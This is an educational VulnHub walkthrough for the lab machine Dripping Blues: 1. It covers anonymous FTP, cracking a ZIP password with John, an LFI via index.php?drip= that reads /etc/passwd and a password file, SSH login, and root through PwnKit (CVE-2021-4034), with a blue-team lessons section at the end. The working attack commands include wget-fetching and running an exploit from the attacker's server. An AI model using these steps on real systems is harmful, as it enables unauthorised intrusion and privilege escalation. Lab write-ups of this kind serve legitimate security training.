# Dripping Blues: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational boot2root walkthrough for students. Everything here is performed on
> an isolated lab network against a machine you intentionally downloaded to attack.
> Never point these techniques at systems you do not own or have written permission to test.

| Field | Value |
| --- | --- |
| **Machine** | Dripping Blues: 1 |
| **Difficulty** | Easy |
| **Author** | tasiyanci |
| **Released** | 19 September 2021 |
| **VulnHub Entry** | [https://vulnhub.com/entry/dripping-blues-1,744/](https://vulnhub.com/entry/dripping-blues-1,744/) |
| **Download** | [https://vulnhub.com/entry/dripping-blues-1,744/#download](https://vulnhub.com/entry/dripping-blues-1,744/#download) (mirror: `https://download.vulnhub.com/drippingblues/drippingblues.ova`, ~2.8 GB) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) on a host-only network |
| **Target OS** | Linux (Ubuntu 20.04, Apache + PHP) |

> **Note on the URL:** the VulnHub entry for *Dripping Blues: 1* is **744**, not
> 657 (657 is a different tasiyanci machine, "Gigachad: 1"). Use
> `https://vulnhub.com/entry/dripping-blues-1,744/`.
>
> **Note:** exact IPs, filenames, passwords, and flags **vary by build**. Where you
> see `192.168.56.101`, substitute whatever address *your* target gets from DHCP.

---

## 0. What you will learn

- How to find a target on an isolated lab subnet with `arp-scan` / `netdiscover`.
- How to enumerate anonymous FTP and pull down an interesting archive.
- How to crack a password-protected ZIP with `zip2john` + `john` (a *real* crypto crack).
- How to read `robots.txt` for hidden paths and follow a hint chain.
- How to fuzz a web parameter with `ffuf` to discover an **LFI** (Local File Inclusion).
- How to use LFI to read files outside the web root (`/etc/dripispowerful.html`).
- How to turn a leaked password into SSH access.
- How to escalate to root by exploiting **PwnKit** (CVE-2021-4034) in `polkit`.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running, be able to
import an OVA, and know your way around a Linux shell.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated lab network.

Confirm your own address so you know the subnet.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP>
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** the host-only adapter (`eth0`) sits on `192.168.56.x`; the target
> VM lands on the **same** subnet.

Sweep the subnet for live hosts:

```bash
sudo netdiscover -r 192.168.56.0/24
# or:
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   (Kali)
192.168.56.101  (target)
```

> **How to read it:** each line is a live host. The unknown MAC that is not your Kali
> box is the target — here `192.168.56.101`.

**Target IP:** `192.168.56.101`

![Finding the target with netdiscover](images/01-recon.png)

---

## 2. Enumeration

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 21,22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0 0    ... respectmydrip.zip
22/tcp open  ssh     OpenSSH 8.x (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Dripping Blues
```

> **How to read it:**
> - **21/tcp FTP** and the Nmap script output `Anonymous FTP login allowed` — we can log
>   in with the username `anonymous` and no password.
> - **22/tcp SSH** — eventual login target.
> - **80/tcp HTTP** — an Apache web app to explore.
> The FTP listing already shows `respectmydrip.zip`, which is worth grabbing.

### 2.1 Anonymous FTP

```bash
ftp 192.168.56.101
# Name: anonymous
# Password: (just press Enter)
ftp> ls
ftp> get respectmydrip.zip
ftp> bye
```

```text
-rw-r--r--  1 0 0   ...   respectmydrip.zip
```

> **Why it works:** the FTP server grants access to the `anonymous` account with no
> authentication. Anything reachable this way is public to the whole network — already a
> misconfiguration.

### 2.2 Crack the ZIP password

The archive is password-protected. First extract the hash, then crack it with John.

```bash
zip2john respectmydrip.zip > respectmydrip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt respectmydrip.hash
```

```text
respectmydrip.zip/respectmydrip.txt:072528035  (respectmydrip.txt)
```

> **Why it works:** `zip2john` converts the ZIP's encryption into a hash format John can
> test. `john` then hashes each word in `rockyou.txt` and compares — this is genuine
> offline password cracking against the ZIP's weak crypto.

Unzip with the recovered password `072528035`:

```bash
unzip respectmydrip.zip
cat respectmydrip.txt
ls -la
```

```text
# respectmydrip.txt -> a hint: "you know ... the drip ..."
# secret.zip        -> a second archive; its own password is a red herring
```

> **Why it works:** the extracted text is a hint (remember the word *drip*), and the
> `secret.zip` is a decoy — both are typical CTF breadcrumbs. Do not waste hours on the
> decoy.

![Cracking and unpacking the ZIP](images/03-zip.png)

### 2.3 The web app and `robots.txt`

```bash
curl -s http://192.168.56.101/robots.txt
curl -s http://192.168.56.101/index.php
```

```text
User-agent: *
Disallow: /dripisreal.txt
Disallow: /etc/dripispowerful.html

# index.php body:
#   driftingblues is hacked again so it's now called drippingblues :D
#   by travisscott & thugger
```

> **Why it works:** `robots.txt` is meant to tell crawlers what *not* to index, but it
> leaks the existence of two paths. `index.php` leaks two usernames: **travisscott** and
> **thugger**. Note the `/etc/dripispowerful.html` entry — a path *outside* the web root,
> which strongly suggests a file-inclusion bug.

Read the two hinted files:

```bash
curl -s http://192.168.56.101/dripisreal.txt
```

```text
# dripisreal.txt: a riddle about ssh password ... "focus on the drip"
```

![robots.txt and the leaked usernames](images/02-enum.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Fuzz for a hidden parameter (LFI)

`index.php` takes a parameter that is not shown anywhere. Fuzz for it by passing a known
file path as the value and looking for responses that differ from the "normal" size.

```bash
ffuf -ic -c -r -w /usr/share/wordlists/dirb/common.txt \
     -u 'http://192.168.56.101/index.php?FUZZ=/etc/passwd' -fs 138
```

```text
drip                    [Status: 200, Size: 3987, Words: 708]
```

> **Why it works:** we replace the parameter **name** with `FUZZ`. When the correct name
> (`drip`) is used, the PHP code includes the file we asked for (`/etc/passwd`) and the
> page *size changes* from the baseline (138 bytes). `-fs 138` filters out the normal
> responses so only the anomaly shows.

> **Why it works:** `include($_GET['drip'])` without validation is a **Local File
> Inclusion** bug — the app will happily read any file the web server can read.

### 3.2 Exploit the LFI to read the secret file

Remember the path from `robots.txt` that lived outside the web root:

```bash
curl -s 'http://192.168.56.101/index.php?drip=/etc/dripispowerful.html'
```

```text
password is:
imdrippinbiatch
```

> **Why it works:** LFI reads files **relative to the server's filesystem**, not the web
> root. `/etc/dripispowerful.html` sits in `/etc/`, which is normally unreachable via a
> URL — but `include()` does not care. The file contains a plaintext password.

### 3.3 Use the password to get SSH access

We have usernames **travisscott** and **thugger** and the password **imdrippinbiatch**.

```bash
ssh thugger@192.168.56.101
# password: imdrippinbiatch
```

```text
thugger@drippingblues:~$ id
uid=1001(thugger) gid=1001(thugger) groups=1001(thugger)
thugger@drippingblues:~$ cat ~/user.txt
5C50FC503A2ABE93B4C5EE3425496521
```

> **Why it works:** the leaked password happens to belong to **thugger**. Password reuse
> between a config/hint file and a real account is exactly the kind of sloppiness this box
> is designed to teach you to spot.

![SSH as thugger and the user flag](images/04-shell-thugger.png)

---

## 4. Privilege escalation — becoming root

### 4.1 Enumerate the system

```bash
uname -a
cat /etc/os-release
ps -ef | grep -i polkit
sudo -l
```

```text
Linux drippingblues 5.x.x-generic ... x86_64
NAME="Ubuntu"  VERSION="20.04 ... "
root ... /usr/lib/policykit-1/polkitd --no-debug
# sudo -l: (you have no password / no sudo rights) -> no easy win here
```

> **How to read it:** there is no obvious `sudo` misconfiguration, but the box is **Ubuntu
> 20.04** running `polkitd`. Ubuntu 20.04 ships a vulnerable `pkexec` — this points us at
> **PwnKit**.

### 4.2 Confirm the vulnerability

**PwnKit (CVE-2021-4034)** is a local privilege-escalation bug in `pkexec` (part of
polkit) present in essentially all mainstream Linux distributions since 2009. It lets any
local user become root without knowing a password. Ubuntu 20.04 was affected.

You can confirm automatically with an enumeration script:

```bash
# On Kali, download linpeas and serve it
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 8000
```

```bash
# On the target (thugger):
cd /tmp
wget http://192.168.56.10:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | grep -i -A2 pwnkit
```

```text
[+] Ubuntu 20.04 ... vulnerable to CVE-2021-4034 (PwnKit)
```

> **Why it works:** `pkexec` mishandles `argc==0`, letting an attacker control the
> environment it uses to find the `pkexec` binary. This allows loading an attacker-supplied
> shared object as root. It is a **local** bug — you already need a foothold.

### 4.3 Exploit PwnKit for root

Download a public PwnKit exploit (`cve-2021-4034.py` or the compiled `PwnKit` binary) to
the target and run it:

```bash
# On Kali (serve it)
cd /tmp
python3 -m http.server 8000
```

```bash
# On the target (thugger):
cd /tmp
wget http://192.168.56.10:8000/cve-2021-4034.py
python3 cve-2021-4034.py
```

```text
pkexec --version ...
# whoami
root
```

> **Why it works:** the exploit copies the public `pkexec` path into a controlled
> location and forces it to load `pwnkit.so` when it runs as root, spawning a root shell.
> No password is needed — the bug is in the program itself.

A common prebuilt variant also drops you straight into a root shell (`./PwnKit`).

### 4.4 The root flag

```bash
id
ls -la /root
cat /root/root.txt
```

```text
uid=0(root) gid=0(root) groups=0(root),1001(thugger)
78CE377EF7F10FF0EDCA63DD60EE63B8
```

> **Why it works:** once we are UID 0, every file on the box — including `/root/root.txt`
> — is readable. Game over.

![Escalating to root with PwnKit](images/05-privesc-pwnkit.png)

![Reading the root flag](images/06-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Anonymous FTP enabled | Port 21 (vsftpd) | Unauthenticated download of `respectmydrip.zip` |
| 2 | Weak ZIP encryption password | `respectmydrip.zip` (`072528035`) | Cracked offline with John the Ripper |
| 3 | Information disclosure via `robots.txt` / `index.php` | Web root | Leaks paths + usernames (`travisscott`, `thugger`) |
| 4 | Local File Inclusion (LFI) | `index.php?drip=` | Reads `/etc/dripispowerful.html`, leaking an SSH password |
| 5 | Password reuse | SSH (`thugger`) | Leaked password gives interactive login |
| 6 | Unpatched `pkexec` (PwnKit, CVE-2021-4034) | Ubuntu 20.04 `polkit` | Local user escalates to root |

## 6. Defensive lessons (blue team)

- **Disable anonymous FTP** and remove public archives from FTP storage; prefer SFTP.
- **Never rely on ZIP/archive passwords** — they are trivially crackable offline. Use real
  encryption (e.g. `age`, GPG) for sensitive bundles.
- **Sanitise file-inclusion input.** Never pass user input straight to `include`/`require`;
  use an allowlist of permitted files or template IDs.
- **Do not leak paths or usernames** in `robots.txt` or page source. Remove leftover
  hint/testing files (`dripisreal.txt`, `dripispowerful.html`).
- **Patch promptly:** Ubuntu 20.04 needed the PwnKit fix. Track CVEs for `polkit`, and use
  unattended-upgrades.
- **Detection:** monitor FTP anonymous logins, unusual file reads via the web app, and
  `pkexec` executions. Alert on outbound connections from a web server.

---

## 7. References

- VulnHub entry: [Dripping Blues: 1](https://vulnhub.com/entry/dripping-blues-1,744/)
- Community writeups consulted:
  - [DrippingBlues-1 writeup — Tanveer Abdulaziz](https://firerey12.github.io/vulnhub/dripping-blues-1)
  - [Vulnhub Drippingblues — V4ler1an](https://www.v4ler1an.com/2023/11/vulnhub_drippingblues/)
  - [HackMyVm Drippingblues Walkthrough](http://www.vxer.cn/2021/09/24/hackmyvm-drippingblues-walkthrough/)
  - [Drippingblues — Kerszi Blog](https://kerszl.github.io/hacking/walkthrough/drippingblues/)
- Vendor advisories / docs:
  - [PwnKit — CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)
  - [NVD — CVE-2021-4034](https://nvd.nist.gov/vuln/detail/CVE-2021-4034)
  - [Polkit exploit PoC](https://github.com/Almorabea/Polkit-exploit)
  - [GTFOBins](https://gtfobins.github.io/)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with netdiscover / arp-scan
- [ ] `images/02-enum.png` — Nmap ports 21/22/80 + anonymous FTP listing
- [ ] `images/03-zip.png` — cracking the ZIP password with John
- [ ] `images/04-shell-thugger.png` — SSH as `thugger` + user flag
- [ ] `images/05-privesc-pwnkit.png` — running the PwnKit exploit
- [ ] `images/06-root-flag.png` — reading `/root/root.txt`
- [ ] `images/07-robots.png` — `robots.txt` and the LFI parameter fuzz (optional)
- [ ] `images/08-lfi.png` — reading `/etc/dripispowerful.html` via LFI (optional)

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
